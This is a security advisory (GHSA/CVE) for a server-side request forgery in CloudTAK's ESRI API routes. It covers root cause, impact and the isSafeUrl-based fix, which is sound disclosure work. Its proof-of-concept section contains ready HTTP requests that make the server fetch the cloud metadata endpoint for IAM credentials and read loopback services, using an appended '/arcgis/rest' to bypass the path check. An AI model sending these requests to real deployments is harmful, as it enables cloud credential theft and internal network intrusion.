# [H] CloudTAK: Authenticated full-read SSRF in the /api/esri* routes — user-controlled URL fetched with no IP-classification guard

## Summary
Severity: High
Advisory: GHSA-r95q-fp26-h3hc
CVE: CVE-2026-55177
CWE: CWE-918
Ecosystem: npm
CVSS: CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:N/SC:N/SI:N/SA:N (CVSS_V4)
Published: 2026-07-17
Source: https://github.com/advisories/GHSA-r95q-fp26-h3hc
Type: github-advisory

## Affected
- npm: `@tak-ps/cloudtak` — affected >=0 <13.10.0

## Details
# Authenticated full-read SSRF in CloudTAK `/api/esri*` routes — user-controlled URL fetched with no IP-classification guard

## Summary

Every route in the ESRI helper family (`api/routes/esri.ts`) takes a fully attacker-controlled URL from the request (`POST /api/esri` body `url`, and the `portal` / `server` / `layer` query parameters on the `GET /api/esri/*` routes) and passes it into `EsriBase` / `EsriProxyPortal` / `EsriProxyServer` / `EsriProxyLayer` in `api/lib/esri.ts`, which fetch it with the bare `fetch` from `@tak-ps/etl`. No IP / DNS / hostname classification is applied at any point, so the destination is never validated against private, loopback, or link-local ranges.

Any authenticated user (the routes only require `Auth.is_auth(config, req, { anyResources: true })`, i.e. any token, not an admin) can therefore make the CloudTAK server issue arbitrary outbound GET/POST requests to internal addresses such as the cloud instance-metadata service (`169.254.169.254`), loopback admin ports (`127.0.0.1:<port>`), and other hosts reachable only from inside the deployment VPC.

This is a **full-read** SSRF, not blind: on success the upstream JSON body is returned to the caller via `res.json(...)`, and on failure the upstream error string is reflected verbatim as `ESRI Server Error: <message>`. An attacker can read cloud metadata (and the temporary IAM credentials the instance role exposes), enumerate internal services, and exfiltrate their response bodies.

The `sniff()` URL classifier provides no protection: it only pattern-matches the *pathname* (`/rest`, `/arcgis/rest`, `/sharing/rest`), so a URL like `http://169.254.169.254/arcgis/rest` or `http://127.0.0.1:8500/rest` passes `sniff()` and is fetched.

## Affected versions

* All versions up to and including **13.7.0** (latest at time of report).

The project already ships an SSRF guard helper — `isSafeUrl` from `@tak-ps/node-safeurl` — and wires it into the basemap, task, and video-service code paths, but the entire `/api/esri*` route family and the ESRI fetch library (`api/lib/esri.ts`) were never wired up, leaving the guard absent on this surface.

## Vulnerable code

All permalinks are pinned to commit `c7433679d2107fa0258e9005069bc5b4ca5773aa` (release lineage of 13.7.0).

**Routes — user input → ESRI fetch, no guard** (`api/routes/esri.ts`):

* `POST /api/esri` — body `url` → `new URL(req.body.url)` → `EsriBase.from(url)`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L32-L64
* `GET /api/esri/portal` — query `portal` → `new EsriBase(req.query.portal)` → `EsriProxyPortal.getPortal()`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L79-L98
* `GET /api/esri/portal/content` — query `portal` → `EsriProxyPortal.getContent()`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L115-L139
* `GET /api/esri/portal/server` — query `portal` → `EsriProxyPortal.getServers()`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L191-L212
* `GET /api/esri/server` — query `server` → `EsriProxyServer.getList()`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L225-L249
* `GET /api/esri/server/layer` — query `layer` → `EsriProxyLayer.sample()`:
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/esri.ts#L333-L356

**Library — the `fetch` sinks** (`api/lib/esri.ts`), all reached with the user URL and none preceded by a guard:

* `import { fetch } from '@tak-ps/etl';`
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L6
* `EsriBase.fetchVersion()` — `const res = await fetch(url);`
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L162-L187
* `EsriBase.generateToken()` — `fetch(url, { method: 'POST', ... })`
  https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L107
* `EsriProxyPortal.getContent` / `getPortal` / `getSelf` / `getServers` / `createService` — `fetch` at lines 283, 301, 330, 347, 371
* `EsriProxyServer.deleteLayer` / `createLayer` / `getList` — `fetch` at lines 407, 433, 455
* `EsriProxyLayer.tilejson` / `#sampleFeatures` — `fetch` at lines 503, 552

**`sniff()` only inspects the pathname** (no host/IP check):
https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/lib/esri.ts#L142-L156

**The guard exists elsewhere but is missing here** — for comparison, the basemap import path classifies the URL before fetching:
https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L85-L90

Note also that the ESRI sub-branch inside `basemap.ts` (`isEsriLayerURL(...)` → `new EsriBase(...)` → `EsriProxyLayer.tilejson()`) reaches the same unguarded ESRI library and is therefore equally affected:
https://github.com/dfpc-coe/CloudTAK/blob/c7433679d2107fa0258e9005069bc5b4ca5773aa/api/routes/basemap.ts#L770-L773

`grep -c isSafeUrl api/routes/esri.ts api/lib/esri.ts` returns `0` and `0`.

## Proof of concept

Prerequisites: a running CloudTAK instance and a valid user token (any non-admin user account — the routes only call `Auth.is_auth(config, req, { anyResources: true })`).

### 1. Read cloud instance metadata (credential theft)

```http
POST /api/esri HTTP/1.1
Host: cloudtak.example.org
Authorization: Bearer <any-valid-user-token>
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/arcgis/rest" }
```

The server's `EsriBase.from()` calls `fetchVersion()` → `fetch('http://169.254.169.254/...?f=json')`. The path contains `/rest`, so `sniff()` classifies it as `SERVER` and the request proceeds. The metadata service's response body is read back to the attacker — either inside the successful JSON response, or reflected in the error string (`ESRI Server Error: <upstream body fragment>`). On AWS IMDSv1 deployments this yields the instance-role temporary credentials.

### 2. Read an internal-only service over loopback / VPC (full-read)

```http
GET /api/esri/server?server=http://127.0.0.1:8500/rest HTTP/1.1
Host: cloudtak.example.org
Authorization: Bearer <any-valid-user-token>
```

`new EsriBase('http://127.0.0.1:8500/rest')` → `EsriProxyServer.getList()` → `fetch('http://127.0.0.1:8500/rest?f=json')`. The full JSON returned by the internal service (here a Consul/admin port, but any internal host:port reachable from the CloudTAK box works) is reflected to the attacker via `res.json(list)`.

`GET /api/esri/portal?portal=http://<internal-host>/sharing/rest` and `GET /api/esri/server/layer?layer=http://<internal-host>/rest/.../FeatureServer/0&query=1=1` give the same full-read primitive on the other sub-routes.

### 3. Negative control — unauthenticated is rejected

```http
POST /api/esri HTTP/1.1
Host: cloudtak.example.org
Content-Type: application/json

{ "url": "http://169.254.169.254/latest/meta-data/arcgis/rest" }
```

Returns `403 Authentication Required` (from `Auth.is_auth` → `api/lib/auth.ts:118`). The SSRF is reachable by any authenticated user but not by an anonymous one.

### E2E reproduction (sink path against a controlled internal victim)

Because exercising the real route against a public cloud metadata endpoint is not something to do against third-party infrastructure, the sink was reproduced against a local internal-only victim using the **same `fetch` import (`@tak-ps/etl`) and the verbatim `EsriBase.sniff()` + `fetchVersion()` logic** the route uses. The harness models the route handler exactly: it `new URL()`s the user input, runs `sniff()`, then `fetch()`s — with `isSafeUrl` deliberately *not* called (matching shipped behavior), and a toggled control branch that calls it (matching the basemap guard).

Victim (`victim.mjs`) — an internal-only service on `127.0.0.1:9099` returning a secret JSON body:

```
[victim] internal service listening on 127.0.0.1:9099
[victim] HIT GET /arcgis/rest?f=json from 127.0.0.1
```

Harness output (`esri_ssrf_e2e.mjs`), user-supplied URL `http://127.0.0.1:9099/arcgis/rest`:

```
[VULN/no-guard] route returned full internal body:
{
  "type": "SERVER",
  "base": "http://127.0.0.1:9099/arcgis/rest",
  "upstreamBody": {
    "currentVersion": "11.4",
    "internal-only": true,
    "aws-metadata-simulated": {
      "iam": { "role": "cloudtak-prod-instance-role", "AccessKeyId": "ASIA_FAKE_INTERNAL_KEY_DO_NOT_USE" }
    },
    "note": "If you can read this from a user-supplied URL, that is SSRF (full-read)."
  }
}
[CONTROL/guarded] blocked as expected: Blocked URL: blocked IP address: 127.0.0.1
```

And `isSafeUrl` confirms it *would* block the metadata / loopback targets if it were called on this path:

```
http://169.254.169.254/latest/meta-data/ => {"safe":false, ... "reason":"blocked IP address: 169.254.169.254"}
http://127.0.0.1:9999/                  => {"safe":false, ... "reason":"blocked IP address: 127.0.0.1"}
http://localhost/                       => {"safe":false, ... "reason":"blocked hostname: localhost"}
```

So: with the shipped (no-guard) code the request reaches the internal victim and the full internal body is returned; with the basemap-style `isSafeUrl` guard the same request is blocked. (A full container OOM-style demonstration of reading real cloud metadata is intentionally not performed against live infrastructure; the victim-host reproduction is the honest, self-contained equivalent of the route's fetch path.)

## Root cause

Two compounding gaps:

1. **No IP/DNS classification before fetch.** `api/lib/esri.ts` imports the unguarded `fetch` from `@tak-ps/etl` and calls it with a URL derived directly from user input in every `EsriProxy*` method and in `EsriBase.fetchVersion()` / `generateToken()`. Nothing resolves the hostname and rejects private / loopback / link-local addresses. The repository already depends on `@tak-ps/node-safeurl` (`isSafeUrl`) precisely for this, and uses it in `api/routes/basemap.ts`, `api/routes/task.ts`, and `api/lib/control/video-service.ts` — but the guard was never added to the ESRI route family or to the ESRI library. This is an **incomplete migration**: the SafeURL hardening (PR #1468) covered basemap/task/video but left `/api/esri*` and `api/lib/esri.ts` (including the ESRI sub-branch of basemap import) unprotected.

2. **`sniff()` validates the wrong thing.** The only inspection the URL receives before being fetched is `EsriBase.sniff()`, which pattern-matches the *pathname* for `/rest`, `/arcgis/rest`, or `/sharing/rest`. It never looks at the host, so an attacker simply appends `/rest` (or `/arcgis/rest`) to an internal URL and it is accepted and fetched.

## Impact

* **CWE-918 Server-Side Request Forgery**, full-read.
* **Cloud credential theft:** reading `http://169.254.169.254/latest/meta-data/iam/security-credentials/...` (IMDSv1) yields the instance role's temporary AWS credentials, which an attacker can use against the deployment's cloud account.
* **Internal network enumeration and data exfiltration:** any host:port reachable from the CloudTAK server (loopback admin ports, VPC-internal services, databases with HTTP interfaces, link-local) can be probed and, where the response is JSON-ish, read in full via the reflected response body / error string.
* **Privilege required:** any authenticated user with any token (`anyResources: true`) — not limited to administrators. Unauthenticated requests are rejected (403), so this requires a valid account but no special role.

## Fix

Centralize the existing `isSafeUrl` guard inside the ESRI library so every `/api/esri*` route and the ESRI sub-branch of basemap import are covered by one chokepoint, mirroring the guard already used in `basemap.ts`:

* Add an async URL-classification step that runs `isSafeUrl(...)` and throws `Blocked URL: <reason>` for any URL that resolves to a private/loopback/link-local address, before the first `fetch` in `EsriBase` (e.g. in `EsriBase.from()` and a guarded constructor/init path, so both `new EsriBase(...)` + later proxy calls and `EsriBase.from(...)` are covered).
* Preserve the existing `process.env.StackName !== 'test'` test-mode skip used elsewhere so the test suite is unaffected.

Because all six routes funnel through `EsriBase` / the `EsriProxy*` classes in `api/lib/esri.ts`, guarding the library is sufficient and avoids re-introducing the same per-route omission. A reference patch implementing exactly this (guard added to the ESRI library + applied on the route entry points, matching the basemap pattern) is provided as a pull request from a private fork.

## Disclosure

* Reported by **tonghuaroot**.
* Credit: tonghuaroot only.

---

**Reference fix PR (private advisory fork):** https://github.com/dfpc-coe/CloudTAK-ghsa-r95q-fp26-h3hc/pull/1 — commit `ff6dd1d9`, centralizing `isSafeUrl` inside `api/lib/esri.ts` (`safeFetch` wrapper + `EsriBase.assertSafe`).

## References
- https://github.com/dfpc-coe/CloudTAK/security/advisories/GHSA-r95q-fp26-h3hc
- https://github.com/dfpc-coe/CloudTAK
- https://github.com/dfpc-coe/CloudTAK/releases/tag/v13.10.0
